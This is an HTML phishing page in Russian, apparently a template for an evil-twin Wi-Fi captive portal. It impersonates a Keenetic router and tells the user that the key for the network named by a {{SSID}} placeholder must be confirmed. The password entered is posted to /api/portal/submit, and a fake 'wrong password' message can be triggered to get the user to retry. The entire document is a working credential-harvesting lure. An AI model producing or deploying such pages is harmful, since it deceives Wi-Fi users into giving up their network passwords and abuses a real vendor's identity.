<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Keenetic</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1B3A6B;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.hdr{padding:20px 24px;display:flex;align-items:center;gap:14px}
.k-logo{width:38px;height:38px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#1B3A6B;flex-shrink:0}
.k-name{color:#fff;font-size:20px;font-weight:700;letter-spacing:.5px}
.k-sub{color:rgba(255,255,255,.55);font-size:11px}
.body{flex:1;padding:16px 20px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center}
.card{background:#fff;border-radius:16px;padding:28px 24px;width:100%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.25)}
.card-icon{width:52px;height:52px;background:#e8effc;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 16px}
.card h2{font-size:17px;color:#1B3A6B;font-weight:700;text-align:center;margin-bottom:6px}
.card .sub{font-size:12px;color:#7a8fa6;text-align:center;margin-bottom:22px;line-height:1.6}
.card .ssid{color:#1B3A6B;font-weight:700}
.field{margin-bottom:14px}
.field label{display:block;font-size:11px;color:#8a9ab0;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
input[type=text],input[type=password]{width:100%;padding:11px 14px;border:1.5px solid #dde5f0;border-radius:8px;font-size:14px;color:#1B3A6B;background:#f6f9fd;outline:none;-webkit-appearance:none}
input[type=text]:focus,input[type=password]:focus{border-color:#1B3A6B;background:#fff}
input[readonly]{color:#a0b0c0}
.btn{width:100%;padding:13px;background:#1B3A6B;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative}
.btn:active{background:#142d54}
.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
.error{display:none;background:#fff3f3;border:1px solid #ffcdd2;border-radius:7px;padding:10px 12px;font-size:12px;color:#c62828;margin-top:10px;text-align:center}
.footer{color:rgba(255,255,255,.3);font-size:11px;text-align:center;padding:16px;margin-top:auto}
</style>
</head>
<body>
<div class="hdr">
  <div class="k-logo">K</div>
  <div><div class="k-name">Keenetic</div><div class="k-sub">Интернет-центр</div></div>
</div>
<div class="body">
  <div class="card">
    <div class="card-icon">&#128246;</div>
    <h2>Требуется подтверждение</h2>
    <p class="sub">Для продолжения работы подтвердите ключ сети <span class="ssid">{{SSID}}</span></p>
    <form method="POST" action="/api/portal/submit" id="frm">
      <input type="hidden" name="ssid" value="{{SSID}}">
      <input type="hidden" name="vendor" value="keenetic">
      <div class="field">
        <label>Сеть</label>
        <input type="text" value="{{SSID}}" readonly>
      </div>
      <div class="field">
        <label>Пароль Wi-Fi</label>
        <input type="password" name="password" placeholder="Введите пароль" required autocomplete="off" minlength="8">
      </div>
      <button type="submit" class="btn" id="sbtn">
        Подтвердить
        <div class="spin" id="sp"></div>
      </button>
    </form>
    <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
  </div>
</div>
<div class="footer">Keenetic Ltd. — Smart Home Router</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  document.getElementById('sp').style.display='block';
  document.getElementById('sbtn').disabled=true;
});
if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
</script>
</body>
</html>
